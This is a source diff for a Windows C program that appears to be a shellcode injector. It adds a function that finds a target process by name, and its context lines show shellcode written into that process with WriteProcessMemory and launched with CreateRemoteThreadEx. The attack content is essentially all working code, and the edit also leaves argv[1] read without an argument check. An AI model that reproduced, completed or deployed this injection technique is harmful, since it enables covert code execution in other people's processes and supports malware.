@@ -2,8 +2,43 @@
 
 #include <stdio.h>
 #include <Windows.h>
+#include <tlhelp32.h>
 
 #include "hook.h"
+
+int findMyProc(const char* procname) {
+
+    HANDLE hSnapshot;
+    PROCESSENTRY32 pe;
+    int pid = 0;
+    BOOL hResult;
+
+    // snapshot of all processes in the system
+    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (INVALID_HANDLE_VALUE == hSnapshot) return 0;
+
+    // initializing size: needed for using Process32First
+    pe.dwSize = sizeof(PROCESSENTRY32);
+
+    // info about first process encountered in a system snapshot
+    hResult = Process32First(hSnapshot, &pe);
+
+    // retrieve information about the processes
+    // and exit if unsuccessful
+    while (hResult) {
+        // if we find the process: return process ID
+        if (strcmp(procname, pe.szExeFile) == 0) {
+            pid = pe.th32ProcessID;
+            break;
+        }
+        hResult = Process32Next(hSnapshot, &pe);
+    }
+
+    // closes an open handle (CreateToolhelp32Snapshot)
+    CloseHandle(hSnapshot);
+    return pid;
+}
+
 
 INT wmain(int argc, char* argv[])
 {
@@ -11,8 +46,32 @@ INT wmain(int argc, char* argv[])
 	PVOID shellAddress = NULL;
 	HANDLE hProcess = (HANDLE)-1;
 	DWORD dwPID = 0;
+
+    dwPID = findMyProc(argv[1]);
+    if (dwPID == 0) {
+        printf("PID not found :( exiting...\n");
+        return 1;
+    }
+    else {
+        printf("PID = %d\n", dwPID);
+    }
+
+    /*if (argc >= 2)
+    {
+        dwPID = findMyProc(argv[1]);
+        if (dwPID == 0)
+        {
+            printf("PID not found :( exiting...\n");
+            return -1;
+        }
+        else {
+            printf("PID = %d\n", dwPID);
+        }
+    }*/
+
+
 	
-	if (argc >= 2)
+	/*if (argc >= 2)
 	{
 		dwPID = _wtoi(argv[1]);
 		if (dwPID == 0)
@@ -27,7 +86,7 @@ INT wmain(int argc, char* argv[])
 		dwPID = _wtoi(cPid);
 		if (dwPID == 0)
 			dwPID = atoi(cPid);
-	}
+	}*/
 
 	if (dwPID == 0) {
 		printf("[!] Failed to get PID\n");
@@ -154,6 +213,7 @@ INT wmain(int argc, char* argv[])
     if (!WriteProcessMemory(hProcess, shellAddress, (LPCVOID)p1, sizeof(p1), NULL)) {
         printf("[!] Failed to call WriteProcessMemory(Shellcode): Status = 0x%08lx\n", GetLastError());
     }
+
 
     printf("[*] Calling CreateRemoteThreadEx\n");
     HANDLE hThread = CreateRemoteThreadEx(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)shellAddress, NULL, NULL, NULL, NULL);
